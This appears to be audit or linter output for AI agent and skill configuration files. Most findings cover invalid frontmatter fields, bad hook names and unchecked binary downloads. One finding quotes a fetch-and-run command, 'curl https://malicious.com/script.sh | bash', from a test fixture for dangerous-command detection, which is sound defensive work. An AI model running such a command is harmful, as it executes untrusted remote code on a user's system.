description: Agent missing both required name and description fields; cannot be registered.
suggested_fix: Add name and description frontmatter fields.

description: Agent file has no YAML frontmatter at all; name and description are absent.
suggested_fix: Add --- delimited YAML frontmatter with name and description fields.

description: SKILL.md file has no YAML frontmatter; name and description are absent.
suggested_fix: Add --- delimited YAML frontmatter with name and description fields.

description: Copilot agent missing required name field; will fail to register.
suggested_fix: Add name field to frontmatter.

description: Copilot agent missing required name field.
suggested_fix: Add name field to frontmatter.

description: Missing name field; target value 'desktop' is not a valid Copilot target (valid: vscode/github/shared).
suggested_fix: Add name field; change target to vscode, github, or shared.

description: Missing name; infer field is string "auto" instead of required boolean type.
suggested_fix: Change infer: "auto" to infer: true and add name field.

description: Missing name; unknown field 'mystery-field' present in frontmatter.
suggested_fix: Remove mystery-field; add name field.

description: Missing name; model: gpt-4.1 is not a valid Claude model; argument-hint is not a Copilot agent field.
suggested_fix: Add name; use a valid model (sonnet/opus/haiku); remove argument-hint.

description: Missing name; infer: null is not a valid boolean value.
suggested_fix: Add name; set infer: true or infer: false.

description: Agent missing required description field.
suggested_fix: Add description field to frontmatter.

description: Agent missing required name field.
suggested_fix: Add name field to frontmatter.

description: Bash appears in both tools and disallowedTools; this is a contradiction and may cause undefined behavior.
suggested_fix: Remove Bash from disallowedTools or from tools.

description: Hook event 'BadEvent' is not a valid Claude Code hook event name.
suggested_fix: Use a valid event: PreToolUse, PostToolUse, Stop, SessionStart, etc.

description: memory: 'global' is not a valid scope; valid values are project, thread, or none.
suggested_fix: Change to memory: project.

description: model: gpt-4 is not a valid Claude Code model; use sonnet, opus, haiku, or inherit.
suggested_fix: Change to model: sonnet.

description: permissionMode: bypassPermissions disables all safety checks and is a security risk.
suggested_fix: Change to permissionMode: acceptEdits or permissionMode: default.

description: permissionMode: admin is not a valid value; valid: default, acceptEdits, dontAsk, bypassPermissions, plan, delegate.
suggested_fix: Use a valid permissionMode value.

description: skills: [nonexistent-skill] references a skill that does not exist in the repository.
suggested_fix: Remove the nonexistent-skill reference or create the skill.

description: tools list includes UnknownTool and FakeRead which are not valid Claude Code tools.
suggested_fix: Remove UnknownTool and FakeRead; use only recognized tool names.

description: Skill references 'MySkill' and 'has_underscore' violate kebab-case naming requirement.
suggested_fix: Rename to my-skill and has-underscore (kebab-case only).

description: disallowedTools includes NotARealTool which is not a valid Claude Code tool.
suggested_fix: Remove NotARealTool from disallowedTools.

description: MCP server auth type 'basic-auth' is not a valid auth type; Gemini CLI only supports google-credentials.
suggested_fix: Change auth type to google-credentials.

description: name: ReviewerAgent is PascalCase (should be kebab-case); description: 123 is numeric; readonly: "true" is string (must be bool).
suggested_fix: Use name: reviewer-agent; give a text description; change readonly: "true" to readonly: true.

description: Hook event 'InvalidEvent' is not a valid Claude Code hook event name.
suggested_fix: Use a valid hook event name such as PreToolUse or Stop.

description: model: gpt-4 is not a valid value for this field; use sonnet, opus, haiku, or inherit.
suggested_fix: Change to model: sonnet.

description: context: split is not a valid value; only 'fork' is supported.
suggested_fix: Change to context: fork or remove the field.

description: disable-model-invocation: "true" is a string; must be boolean true.
suggested_fix: Change to disable-model-invocation: true (no quotes).

description: name: invalid_name contains underscore; skill names must be kebab-case.
suggested_fix: Rename to invalid-name.

description: agent: Invalid_Agent contains underscore; must be built-in name or kebab-case custom name.
suggested_fix: Rename to invalid-agent or use a built-in agent type.

description: allowed-tools includes FakeTool and UnknownTool which are not valid Claude Code tools.
suggested_fix: Remove FakeTool and UnknownTool.

description: context: fork requires an agent field; omitting it makes the fork context unroutable.
suggested_fix: Add agent: general-purpose or another valid agent name.

description: agent: Explore requires context: fork to have effect; without it the field is ignored.
suggested_fix: Add context: fork to the frontmatter.

description: user-invocable: "false" is a string; must be boolean false.
suggested_fix: Change to user-invocable: false (no quotes).

description: Hook type 'webhook' is not a valid Claude Code hook type; valid types are command, prompt, agent, mcp_tool.
suggested_fix: Change type to command and add command field, or use another valid type.

description: mcp_tool hook missing required server and tool fields; hook cannot execute.
suggested_fix: Add server and tool fields to the mcp_tool hook object.

description: command type hook missing required command field; hook cannot execute.
suggested_fix: Add command field with the shell command to run.

description: Hook objects missing required type field; hook cannot execute.
suggested_fix: Add type: command or type: prompt to each hook object.

description: prompt type hook missing required prompt field.
suggested_fix: Add prompt field with the prompt text.

description: Hook event 'notRealEvent' is not a valid Copilot hook event name.
suggested_fix: Use a valid Copilot hook event name.

description: plugin.json version is 0.16.1 while npm/package.json is 0.20.0; plugin metadata is 4 minor versions behind.
suggested_fix: Run version sync script and bump plugin.json to match npm package version.

description: Description cites '405 rules' but CLAUDE.md documents 414 rules; npm package is v0.20.0.
suggested_fix: Run scripts/sync-rule-bookkeeping.js to update derived counts in plugin files.

description: Description cites '405 rules' but CLAUDE.md documents 414 rules.
suggested_fix: Run scripts/sync-rule-bookkeeping.js and update plugin skill description.

description: Description cites '405 rules' but CLAUDE.md documents 414 rules.
suggested_fix: Run scripts/sync-rule-bookkeeping.js and update root skill description.

description: plugin/skills/agnix/SKILL.md has argument-hint but no allowed-tools; skills/agnix/SKILL.md has allowed-tools but no argument-hint; neither is complete relative to the other.
suggested_fix: Align both files: add allowed-tools to plugin skill and add argument-hint to root skill.

description: postinstall script 'node install.js' automatically downloads a platform binary from GitHub releases during npm install without checksum verification; supply-chain risk if GitHub releases are compromised.
suggested_fix: Add SHA256 checksum verification step in install.js before executing the downloaded binary.

description: curl downloads binary from GitHub releases; no SHA256 or GPG signature verification before extracting and using the binary.
suggested_fix: Download a checksum file from the release alongside the binary and verify with sha256sum -c before extraction.

description: https.get downloads binary from GitHub releases; no checksum verification before renaming and chmod +x.
suggested_fix: Fetch corresponding .sha256 file from release and verify digest before making binary executable.

description: curl -sL fetches content from html_url values in .github/tool-release-baselines.json; URLs are config-controlled but content is not validated before use in issue bodies.
suggested_fix: Add --max-time and size limits (already has --max-time 30); consider validating URL origin against an allowlist.

description: Up to 80K chars of stdin content (sourced from external repos in tool-release-watch workflow) is sent to api.z.ai GLM API; no data redaction or sanitization before transmission.
suggested_fix: Document in CI setup that GLM_API_KEY enables sending repo content to z.ai; add explicit log warning when exfiltrating external content.

description: Contains 'curl https://malicious.com/script.sh | bash' which would execute arbitrary remote code.
fp_reason: This is an intentional test fixture designed to verify the agnix dangerous-command detection rule fires; the file is under tests/fixtures/invalid/ and is never executed.
rule_gap: Scanner should skip files under tests/fixtures/ or files with 'invalid' in their path prefix when checking for dangerous patterns, or suppress findings when the file type is a test fixture for a linter.
suggested_fix: No action needed; fixture exists by design.

description: No example interaction blocks showing expected agent behavior.
suggested_fix: Add one or two ## Example sections showing a sample invocation and structured result.

description: Has code-block output examples but no agent-style interaction example turns.
suggested_fix: Add a ## Example section with a sample /agnix invocation and the expected markdown response.

description: No model field declared; inherits caller's model tier rather than specifying the appropriate execution model.
suggested_fix: Add model: sonnet to the frontmatter.

description: No model field declared.
suggested_fix: Add model: sonnet to the frontmatter.
